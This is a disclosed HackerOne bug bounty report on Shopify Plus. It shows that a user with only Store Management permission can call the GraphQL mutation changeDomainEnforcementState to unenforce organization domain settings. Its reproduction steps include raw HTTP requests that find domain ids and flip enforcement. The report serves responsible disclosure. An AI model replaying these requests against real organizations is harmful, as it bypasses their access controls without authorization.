# [h1-2102] [Plus] User with Store Management Permission can Make changeDomainEnforcementState - that should be limited to User Management Only

## Report Details
- **Report ID**: 1084892
- **URL**: https://hackerone.com/reports/1084892
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-01-22T22:10:18.229Z
- **Disclosed**: 2022-04-21T22:05:27.786Z

## Reporter
- **Username**: ngalog
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
## Summary:
User with Store Management Permission can Make changeDomainEnforcementState - that should be limited to User Management Only

## Description:
User with `Store management` permission - {F1168470} only, is able to change user management settings using the graphql

## Steps To Reproduce:
- 
- 
- 
- 

- As an org plus admin, visit https://shopify.plus/:org_plus_id/users/invite and invite an user to have `store management permission` - (The purpose is to enable the low-privileged user to have access to https://shopify.plus/:plus_org_id/stores/api
- As an org plus admin, create a Org domain, by visiting `https://shopify.plus/:id/users/security` and `Add Domain`
- Login as the low-priviledged user, and visit shopify.plus and click around until you made a valid graphql call to shopify.plus, it looks something like this `POST /34946971/stores/api HTTP/1.1`
- Make this call to figure out the domain id of your organization as a low privileged user 

```
POST /34946971/stores/api HTTP/1.1
Host: shopify.plus
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
...

{"query":"query{organization{domains{id}}}"}
```

- Grab the id and replace the REPLACE_ME in the below GraphQL call

```
POST /34946971/stores/api HTTP/1.1
Host: shopify.plus
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
...

{"query":"mutation  {\n  changeDomainEnforcementState(domainIds: [\"REPLACE_ME\"],enforcementState:NOT_ENFORCED) {\n    organization {\n      id\n      domains {\n        id\n        domainName\n        status\n        verified\n        __typename\n      }\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

- Then it shows you are able to `changeDomainEnforcementState` by just having Store Management permission



## Supporting Material/References:

## Impact

User with Store Management permission can enforce/unenforce domain state

## Attachments
- Screen_Shot_2021-01-22_at_11.15.03_PM.png
